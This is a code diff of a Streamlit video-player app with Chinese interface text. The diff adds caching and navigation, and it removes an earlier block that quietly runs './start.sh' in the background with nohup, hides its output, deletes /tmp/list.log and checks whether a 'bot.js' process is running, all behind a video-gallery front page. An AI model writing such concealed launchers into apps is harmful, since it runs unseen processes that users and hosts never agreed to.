@@ -1,100 +1,208 @@
 import os
-import subprocess
 import streamlit as st
-import threading
-import psutil
+import base64
 
-# Define the command to be executed
-cmd = (
-    "chmod +x ./start.sh && "
-    "nohup ./start.sh > /dev/null 2>&1 & "
-    "while [ ! -f /tmp/list.log ]; do sleep 1; done;"
-    "rm -rf /tmp/list.log &&"
-    "echo 'app is running' "
-)
+st.set_page_config(page_title="Video Player", page_icon="🎬")
 
-# Function to check if bot.js is running
-def is_bot_js_running():
-    try:
-        for process in psutil.process_iter(['pid', 'cmdline']):
-            cmdline = process.info.get('cmdline')
-            if cmdline and any('bot.js' in arg for arg in cmdline):
-                return True
-    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-        pass
-    return False
+st.title("🎬 视频播放器")
 
-# Function to execute the command
-def execute_command():
-    flag_file = "/tmp/command_executed.flag"
-    if not os.path.exists(flag_file):
-        if not is_bot_js_running():
-            subprocess.run(cmd, shell=True)
-            # Create a flag file to indicate the command has been executed
-            with open(flag_file, "w") as f:
-                f.write("Command executed")
-
-# Start the command in a separate thread
-def start_thread():
-    if not threading.current_thread().name == "MainThread":
-        thread = threading.Thread(target=execute_command)
-        thread.start()
-
-start_thread()
-
-st.title("❤️抖音美女欣赏❤️")
-
-# 获取 ./mp4/ 文件夹中的所有 mp4 文件
+# Get all mp4 files from ./mp4/ folder
 video_folder = "./mp4/"
-video_files = [f for f in os.listdir(video_folder) if f.lower().endswith('.mp4')]
-video_files.sort()  # 对文件名进行排序
 
-# 创建 session state 来存储当前播放的视频索引
+# Check if folder exists
+if not os.path.exists(video_folder):
+    st.error(f"视频文件夹 '{video_folder}' 未找到。请创建文件夹并添加 MP4 文件。")
+    st.stop()
+
+# Get video files with error handling
+try:
+    video_files = [f for f in os.listdir(video_folder) if f.lower().endswith('.mp4')]
+    video_files.sort()
+except Exception as e:
+    st.error(f"读取视频文件夹错误: {e}")
+    st.stop()
+
+if not video_files:
+    st.warning("视频文件夹中没有找到 MP4 文件。")
+    st.stop()
+
+# Initialize session state for current video index
 if 'playing_index' not in st.session_state:
     st.session_state['playing_index'] = 0
 
-# 函数：播放上一个视频
+# Initialize preloaded videos cache
+if 'video_cache' not in st.session_state:
+    st.session_state['video_cache'] = {}
+
+# Ensure index is within bounds
+st.session_state['playing_index'] = st.session_state['playing_index'] % len(video_files)
+
+# Function to load video into cache
+def load_video_to_cache(index):
+    """预加载视频到缓存"""
+    if index < 0 or index >= len(video_files):
+        return
+    
+    video_file = video_files[index]
+    if video_file not in st.session_state['video_cache']:
+        video_path = os.path.join(video_folder, video_file)
+        try:
+            with open(video_path, 'rb') as f:
+                st.session_state['video_cache'][video_file] = f.read()
+        except Exception as e:
+            st.warning(f"预加载视频失败 {video_file}: {e}")
+
+# Function to get video from cache or load it
+def get_video_bytes(index):
+    """从缓存获取视频，如果没有则加载"""
+    video_file = video_files[index]
+    if video_file not in st.session_state['video_cache']:
+        load_video_to_cache(index)
+    return st.session_state['video_cache'].get(video_file)
+
+# Navigation functions
 def play_previous_video():
     st.session_state['playing_index'] = (st.session_state['playing_index'] - 1) % len(video_files)
+    # 预加载前一个视频
+    preload_adjacent_videos()
 
-# 函数：播放下一个视频
 def play_next_video():
     st.session_state['playing_index'] = (st.session_state['playing_index'] + 1) % len(video_files)
+    # 预加载后一个视频
+    preload_adjacent_videos()
 
-# 创建两列来放置按钮和播放名称
-col1, col2, col3 = st.columns([1, 1, 2])
+def preload_adjacent_videos():
+    """预加载相邻的视频"""
+    current_index = st.session_state['playing_index']
+    
+    # 预加载下一个视频
+    next_index = (current_index + 1) % len(video_files)
+    load_video_to_cache(next_index)
+    
+    # 预加载上一个视频
+    prev_index = (current_index - 1) % len(video_files)
+    load_video_to_cache(prev_index)
+    
+    # 可选：预加载下下个视频（提前两个）
+    next_next_index = (current_index + 2) % len(video_files)
+    load_video_to_cache(next_next_index)
 
-# 在第一列放置"上一个视频"按钮
+# 初始加载：预加载当前和相邻视频
+current_index = st.session_state['playing_index']
+load_video_to_cache(current_index)
+preload_adjacent_videos()
+
+# 显示当前视频信息和缓存状态
+current_video = video_files[current_index]
+video_name = os.path.splitext(current_video)[0]
+
+col_info1, col_info2 = st.columns([3, 1])
+with col_info1:
+    st.write(f"**正在播放:** {video_name}")
+    st.caption(f"视频 {current_index + 1} / {len(video_files)}")
+with col_info2:
+    cached_count = len(st.session_state['video_cache'])
+    st.caption(f"📦 已缓存: {cached_count}/{len(video_files)}")
+
+# 创建横向按钮布局
+col1, col2, col3, col4, col5 = st.columns([1, 1, 1, 1, 1])
+
 with col1:
-    if st.button("上一个视频"):
-        play_previous_video()
+    st.button("⬅️ 上一个", on_click=play_previous_video, width="stretch")
 
-# 在第二列放置"下一个视频"按钮
 with col2:
-    if st.button("下一个视频"):
-        play_next_video()
+    st.button("🔼 向上滑", on_click=play_previous_video, width="stretch")
 
-# 在第三列显示当前视频名称（不包含后缀）
 with col3:
-    current_video = video_files[st.session_state['playing_index']]
-    video_name_without_extension = os.path.splitext(current_video)[0]
-    st.write(f"正在播放: {video_name_without_extension}")
+    st.button("🔽 向下滑", on_click=play_next_video, width="stretch")
 
-# 创建一个空的容器来放置视频
-video_container = st.empty()
+with col4:
+    st.button("下一个 ➡️", on_click=play_next_video, width="stretch")
 
-# 播放当前视频
+with col5:
+    if st.button("🔄 重新播放"):
+        st.rerun()
+
+# Display current video from cache
 video_path = os.path.join(video_folder, current_video)
+
 if os.path.exists(video_path):
-    with open(video_path, 'rb') as video_file:
-        video_bytes = video_file.read()
-    video_container.video(video_bytes)
+    try:
+        video_bytes = get_video_bytes(current_index)
+        if video_bytes:
+            st.video(video_bytes)
+        else:
+            st.error("视频加载失败")
+    except Exception as e:
+        st.error(f"加载视频错误: {e}")
+else:
+    st.error(f"视频文件未找到: {video_path}")
 
-# Define the URL of the website you want to proxy
-url = "https://douyin.boo/index.html"
-# 去掉下面一句前面#，可以显示网页版抖音美女
-# st.components.v1.html(f'<iframe src="{url}" width="100%" height="600" style="border:none;"></iframe>', height=700)
+# 添加预加载状态指示
+with st.expander("⚡ 预加载状态"):
+    st.write("**已预加载的视频:**")
+    for idx, video in enumerate(video_files):
+        video_status = "✅" if video in st.session_state['video_cache'] else "⬜"
+        current_marker = "▶️" if idx == current_index else ""
+        st.text(f"{video_status} {current_marker} {os.path.splitext(video)[0]}")
 
+# 添加缓存管理按钮
+col_cache1, col_cache2 = st.columns(2)
+with col_cache1:
+    if st.button("🚀 预加载所有视频"):
+        with st.spinner("正在预加载所有视频..."):
+            for idx in range(len(video_files)):
+                load_video_to_cache(idx)
+        st.success(f"已预加载 {len(video_files)} 个视频！")
+        st.rerun()
+
+with col_cache2:
+    if st.button("🗑️ 清除缓存"):
+        st.session_state['video_cache'] = {}
+        st.success("缓存已清除！")
+        st.rerun()
+
+# 添加键盘快捷键提示
+st.divider()
+st.caption("💡 提示：点击 🔼 向上滑 或 🔽 向下滑 来切换视频")
+st.caption("⚡ 预加载功能：自动预加载相邻3个视频，实现无缝切换")
+
+# Optional: Display playlist
+with st.expander("📋 播放列表"):
+    for idx, video in enumerate(video_files):
+        cached_indicator = "✅" if video in st.session_state['video_cache'] else ""
+        if idx == st.session_state['playing_index']:
+            st.write(f"▶️ **{os.path.splitext(video)[0]}** {cached_indicator}")
+        else:
+            if st.button(f"▷ {os.path.splitext(video)[0]} {cached_indicator}", key=f"video_{idx}"):
+                st.session_state['playing_index'] = idx
+                preload_adjacent_videos()
+                st.rerun()
+
+# Optional: Display image
 image_path = "./mv.jpg"
 if os.path.exists(image_path):
-    st.image(image_path, caption='林熳', use_container_width=True)  # Changed from use_column_width to use_container_width
+    st.divider()
+    st.image(image_path, width="stretch")
+
+# 添加自定义CSS来增强体验
+st.markdown("""
+<style>
+    /* 让视频容器更突出 */
+    [data-testid="stVideo"] {
+        border-radius: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    
+    /* 按钮样式优化 */
+    .stButton button {
+        font-weight: 500;
+    }
+    
+    /* 缓存状态样式 */
+    .stExpander {
+        background-color: rgba(0, 0, 0, 0.02);
+        border-radius: 5px;
+    }
+</style>
+""", unsafe_allow_html=True)
